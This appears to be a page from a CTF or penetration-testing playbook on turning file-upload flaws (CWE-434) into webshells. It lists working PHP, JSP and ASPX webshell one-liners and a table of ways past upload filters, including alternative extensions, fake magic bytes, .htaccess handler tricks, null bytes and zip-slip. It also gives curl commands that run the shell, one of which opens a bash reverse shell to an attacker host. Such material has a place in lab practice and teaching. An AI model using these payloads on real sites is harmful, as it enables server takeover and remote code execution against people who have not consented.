# File upload → webshell (CWE-434)

**Signs**: avatar/attachment/document/plugin/theme upload; uploaded files served back from a URL
(`/uploads/x.png`); PHP/ASP/JSP stack (they execute files by extension).

## 1. Learn the rules
Upload a normal image, find its URL (response, HTML, `/uploads/`). Then test what's checked:
extension, `Content-Type`, magic bytes, image parsing, filename sanitising.

## 2. Webshells
```php
<?php system($_GET['c']); ?>                     (shell.php → /uploads/shell.php?c=id)
<?php echo file_get_contents('/flag/flag'); ?>
GIF89a;<?php system($_GET['c']); ?>              (passes magic-byte check)
```
JSP: `<% Runtime.getRuntime().exec(request.getParameter("c")); %>`; ASPX via `cmd.exe /c`.
Ready-made: `scripts/web/shells/` (`shell.php`, `shell.phtml`, `revshell.php`).

## 3. Bypasses
| Check | Bypass |
|---|---|
| Extension denylist | `.phtml .php5 .php7 .phar .pht .phps .PhP .php.` , `shell.php%00.png` (old) |
| Extension allowlist (last ext) | `shell.png.php` / `shell.php.png` + Apache `AddHandler` quirk |
| `Content-Type` | set `image/png` in the multipart part (Burp) |
| Magic bytes | prepend `GIF89a;` or a real PNG header; polyglot images (exiftool comment) |
| Can't upload .php | upload `.htaccess`: `AddType application/x-httpd-php .png` then `x.png` |
| Executes nowhere | combine with LFI ([lfi-path-traversal](lfi-path-traversal.md)) or path traversal in filename (`../../var/www/html/s.php`) |
| Image re-encoded | put payload in a chunk that survives (IDAT tricks) or use LFI on non-image upload |
| ZIP extraction | zip-slip `../../` entries; symlinks in archives |

## 4. Use it
```bash
curl -s "$T/uploads/shell.php?c=cat+/flag/flag"
curl -s "$T/uploads/shell.php" --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/YOU/443 0>&1'"
```
→ [reverse-shells](../11-post-exploitation/reverse-shells.md), [find-the-flag](../11-post-exploitation/find-the-flag.md)

CMS admin = upload by design: WordPress plugin/theme upload or theme editor →
[wordpress](../08-vuln-apps/wordpress.md#3-admin--code-execution).

Seen in: DVWA/bWAPP "Unrestricted File Upload", `wordpress` (plugin zip upload after admin).
